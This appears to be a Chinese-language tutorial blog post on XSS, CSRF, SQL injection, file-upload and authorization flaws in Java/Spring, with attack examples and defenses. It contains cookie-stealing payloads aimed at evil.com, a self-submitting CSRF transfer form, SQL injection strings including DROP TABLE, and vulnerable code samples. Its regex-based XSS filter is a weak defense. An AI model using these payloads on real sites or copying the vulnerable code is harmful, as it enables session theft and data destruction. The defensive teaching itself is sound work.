---
title: Web 安全实战：XSS、CSRF 与 SQL 注入的攻击与防御
tag: ["安全", "XSS", "CSRF", "SQL注入", "Web安全"]
category: 安全
date: 2026-06-27
---

# Web 安全实战：XSS、CSRF 与 SQL 注入的攻击与防御

> Web 安全实战：XSS、CSRF 与 SQL 注入的攻击与防御是网络安全中常见的威胁，攻击者通过各种手段获取非法利益或破坏系统安全。
> 本文介绍了Web 安全实战：XSS、CSRF 与 SQL 注入的攻击与防御的原理、危害和防御策略，帮助你构建更安全的系统。


OWASP Top 10 中，XSS、CSRF 和 SQL 注入至今仍是出现频率最高的安全漏洞。本文从攻击原理到防御方案，全链路覆盖。

## 一、XSS（跨站脚本攻击）

### 1.1 攻击原理

攻击者将恶意 JavaScript 注入到网页中，在用户浏览器中执行。

```
攻击链路：
1. 攻击者在评论区提交：<script>fetch('http://evil.com?cookie='+document.cookie)</script>
2. 网站未过滤，直接存储到数据库
3. 其他用户查看评论时，恶意脚本在浏览器执行
4. 用户 Cookie 被发送到攻击者服务器
```

### 1.2 三种 XSS 类型

| 类型 | 原理 | 危害 |
|------|------|------|
| 存储型 | 恶意脚本存储在数据库，每次访问都触发 | 最严重 |
| 反射型 | 恶意脚本在 URL 参数中，服务器原样返回 | 中等 |
| DOM 型 | 纯前端 JS 操作 DOM 引入，不经过服务器 | 中等 |

### 1.3 攻击示例

```java
// 存储型 XSS
// 用户在评论框输入：
<img src=x onerror="fetch('http://evil.com/steal?c='+document.cookie)">

// 后端未过滤直接存储
@PostMapping("/comment")
public Result addComment(@RequestBody Comment comment) {
    commentMapper.insert(comment); // 直接存入，未过滤
    return Result.success();
}

// 其他用户查看评论时，onerror 触发，Cookie 泄露
```

### 1.4 防御方案

```java
// 1. 输出编码（最核心）
// 使用 OWASP Java HTML Sanitizer
import org.owasp.html.HtmlPolicyBuilder;
import org.owasp.html.PolicyFactory;

PolicyFactory policy = new HtmlPolicyBuilder()
    .allowElements("p", "br", "strong", "em", "ul", "ol", "li")
    .disallowElements("script", "img", "iframe", "object", "embed")
    .toFactory();

String safeHtml = policy.sanitize(userInput);
// <script>alert(1)</script> → 被完全移除

// 2. Spring Boot 全局 XSS 过滤
@Component
public class XssFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                         FilterChain chain) throws IOException, ServletException {
        XssHttpServletRequestWrapper wrappedRequest = 
            new XssHttpServletRequestWrapper((HttpServletRequest) request);
        chain.doFilter(wrappedRequest, response);
    }
}

public class XssHttpServletRequestWrapper extends HttpServletRequestWrapper {
    @Override
    public String getParameter(String name) {
        String value = super.getParameter(name);
        return value != null ? cleanXSS(value) : null;
    }
    
    private String cleanXSS(String value) {
        value = value.replaceAll("<script>", "");
        value = value.replaceAll("</script>", "");
        value = value.replaceAll("<", "&lt;");
        value = value.replaceAll(">", "&gt;");
        return value;
    }
}

// 3. Cookie 设置 HttpOnly
server:
  servlet:
    session:
      cookie:
        http-only: true    # JS 无法读取 Cookie
        secure: true       # 仅 HTTPS 传输
        same-site: strict  # 跨站不发送 Cookie（同时防 CSRF）

// 4. Content Security Policy（CSP）
// Nginx 配置
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';";
```

## 二、CSRF（跨站请求伪造）

### 2.1 攻击原理

```
1. 用户登录 bank.com，获得 Cookie
2. 用户访问 evil.com
3. evil.com 页面中有一个隐藏表单，自动提交到 bank.com/transfer
4. 浏览器自动带上 bank.com 的 Cookie
5. 银行服务器以为是用户本人操作，执行转账
```

```html
<!-- evil.com 的攻击页面 -->
<form action="http://bank.com/transfer" method="POST" id="csrf-form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf-form').submit();</script>
```

### 2.2 防御方案

```java
// 1. CSRF Token（最主流的防御方式）
// Spring Security 默认开启 CSRF 防护
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(csrf -> csrf
            .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
        );
        return http.build();
    }
}
// 前端从 Cookie 中读取 XSRF-TOKEN，放到请求头 X-XSRF-TOKEN
// 因为攻击者无法读取 Cookie（同源策略），所以无法伪造 Token

// 2. SameSite Cookie（最简单的防御）
server:
  servlet:
    session:
      cookie:
        same-site: strict  # 跨站请求不带 Cookie
// SameSite 三种值：
// strict: 完全不带（最安全，但影响用户体验）
// lax:   GET 请求带，POST 不带（推荐）
// none:  不限制（不推荐）

// 3. 双重 Cookie 验证
// 设置一个 Cookie 值，同时要求请求参数中带上同样的值
@PostMapping("/transfer")
public Result transfer(@RequestParam String csrfToken, 
                       @CookieValue("csrfToken") String cookieToken,
                       TransferRequest request) {
    if (!csrfToken.equals(cookieToken)) {
        throw new SecurityException("CSRF Token 验证失败");
    }
    // 执行转账
}

// 4. 自定义 Header 验证（API 项目推荐）
// 要求请求带上自定义头 X-Requested-With
// 攻击者无法用表单提交自定义头
@GetMapping("/api/data")
public Result getData(@RequestHeader("X-Requested-With") String requestedWith) {
    if (!"XMLHttpRequest".equals(requestedWith)) {
        throw new SecurityException("非法请求");
    }
    // 返回数据
}
```

## 三、SQL 注入

### 3.1 攻击原理

```java
// 漏洞代码：字符串拼接 SQL
@GetMapping("/user")
public User getUserByName(@RequestParam String name) {
    String sql = "SELECT * FROM users WHERE name = '" + name + "'";
    // 用户输入: ' OR '1'='1
    // 实际 SQL: SELECT * FROM users WHERE name = '' OR '1'='1'
    // 结果：返回所有用户数据！
    return jdbcTemplate.queryForObject(sql, User.class);
}

// 更严重的攻击：
// 输入: '; DROP TABLE users; --
// SQL: SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
// 表被删除！
```

### 3.2 防御方案

```java
// 1. 预编译语句（最核心的防御）
// MyBatis 使用 #{} 自动参数化
@Select("SELECT * FROM users WHERE name = #{name}")
User selectByName(@Param("name") String name);
// 实际执行：SELECT * FROM users WHERE name = ?  → 参数会被安全转义

// 2. MyBatis ${} 的危险（绝对不要用 ${} 接收用户输入）
// ${} 是字符串拼接，不参数化！
@Select("SELECT * FROM users WHERE name = '${name}'")  // 危险！
User selectByNameUnsafe(@Param("name") String name);

// 如果必须用 ${}（如动态表名、列名），必须做白名单校验
public List<User> queryByColumn(String column, String value) {
    // 白名单校验列名
    Set<String> allowedColumns = Set.of("name", "email", "phone");
    if (!allowedColumns.contains(column)) {
        throw new SecurityException("非法列名");
    }
    return userMapper.queryByColumn(column, value);
}

// 3. JPA/Hibernate 参数化查询
@Query("SELECT u FROM User u WHERE u.name = :name")
User findByName(@Param("name") String name);

// 4. JdbcTemplate 参数化
public User findByName(String name) {
    String sql = "SELECT * FROM users WHERE name = ?";
    return jdbcTemplate.queryForObject(sql, new Object[]{name}, 
        (rs, rowNum) -> new User(rs.getString("name"), rs.getString("email")));
}
```

### 3.3 SQL 注入检测

```java
// 使用 OWASP ZAP 或 SQLMap 做安全扫描
// 代码审查重点：
// 1. 搜索所有 ${} 使用点（MyBatis）
// 2. 搜索所有字符串拼接 SQL
// 3. 搜索所有 Statement（应该用 PreparedStatement）
```

## 四、其他常见 Web 安全威胁

### 4.1 文件上传漏洞

```java
// 漏洞：未校验文件类型
@PostMapping("/upload")
public Result upload(@RequestParam MultipartFile file) {
    // 攻击者上传 shell.jsp（WebShell）
    String filename = file.getOriginalFilename();
    file.transferTo(new File("/app/uploads/" + filename)); // 直接保存
    // 攻击者访问 /uploads/shell.jsp → 执行任意代码
}

// 防御
@PostMapping("/upload")
public Result upload(@RequestParam MultipartFile file) {
    // 1. 白名单校验文件扩展名
    String filename = file.getOriginalFilename();
    String ext = filename.substring(filename.lastIndexOf(".")).toLowerCase();
    if (!Set.of(".jpg", ".png", ".pdf", ".docx").contains(ext)) {
        throw new SecurityException("不支持的文件类型");
    }
    
    // 2. 校验文件头（防止改扩展名）
    byte[] bytes = file.getBytes();
    String fileType = detectFileType(bytes);  // 用 Apache Tika 检测
    if (!Set.of("image/jpeg", "image/png", "application/pdf").contains(fileType)) {
        throw new SecurityException("文件内容与类型不匹配");
    }
    
    // 3. 重命名文件（不使用用户提供的文件名）
    String safeName = UUID.randomUUID() + ext;
    file.transferTo(new File("/app/uploads/" + safeName));
    
    // 4. 上传目录不可执行
    // Nginx: location /uploads/ { location ~ \.(jsp|php|sh)$ { deny all; } }
    return Result.success(safeName);
}
```

### 4.2 越权访问

```java
// 漏洞：水平越权
@GetMapping("/order/{id}")
public Result getOrder(@PathVariable Long id) {
    Order order = orderMapper.selectById(id);
    // 未校验当前用户是否有权查看此订单
    // 用户 A 可以查看用户 B 的订单！
    return Result.success(order);
}

// 防御
@GetMapping("/order/{id}")
public Result getOrder(@PathVariable Long id, @AuthenticationPrincipal UserPrincipal user) {
    Order order = orderMapper.selectById(id);
    // 校验数据归属
    if (!order.getUserId().equals(user.getId())) {
        throw new AccessDeniedException("无权访问此订单");
    }
    return Result.success(order);
}
```

## 五、Spring Security 安全配置清单

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // XSS 防护
            .headers(headers -> headers
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeaderWriter.HeaderValue.ENABLED_MODE_BLOCK))
                .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
            )
            // CSRF 防护
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .ignoringRequestMatchers("/api/public/**")  // 公开 API 豁免
            )
            // 会话管理
            .sessionManagement(session -> session
                .sessionFixation(fixation -> fixation.changeSessionId())  // 登录后换 Session ID
                .maximumSessions(1)  // 单设备登录
                .maxSessionsPreventsLogin(false)  // 新登录踢掉旧会话
            )
            // 请求授权
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

## 六、面试要点

### Q：XSS 怎么防？

1. 输出编码：HTML 内容用 `&lt;` 转义，JS 内容用 Unicode 转义
2. 使用 OWASP HTML Sanitizer 过滤富文本
3. Cookie 设 HttpOnly，防止 JS 读取
4. 设置 CSP（Content Security Policy）限制脚本来源

### Q：CSRF 和 XSS 的区别？

- **XSS**：攻击者在用户浏览器中执行恶意脚本（利用用户对网站的信任）
- **CSRF**：攻击者伪造用户请求发送到网站（利用网站对用户的信任）
- **防御不同**：XSS 靠输出编码和 CSP；CSRF 靠 Token 和 SameSite Cookie

### Q：MyBatis 中 #{} 和 ${} 的区别？

- `#{}` 是预编译参数化（PreparedStatement），自动防 SQL 注入
- `${}` 是字符串拼接，有 SQL 注入风险
- 规则：用户输入一律用 `#{}`，只有表名/列名等结构化 SQL 才用 `${}` 且必须白名单校验

## 七、总结

Web 安全三板斧：

| 威胁 | 核心防御 | 一句话 |
|------|---------|--------|
| XSS | 输出编码 + CSP + HttpOnly | 永远不信任用户输入 |
| CSRF | Token + SameSite Cookie | 验证请求来源 |
| SQL 注入 | 预编译语句 | 永远用 #{} 不用 ${} |

安全原则：**输入不可信，输出必编码，权限必校验**。
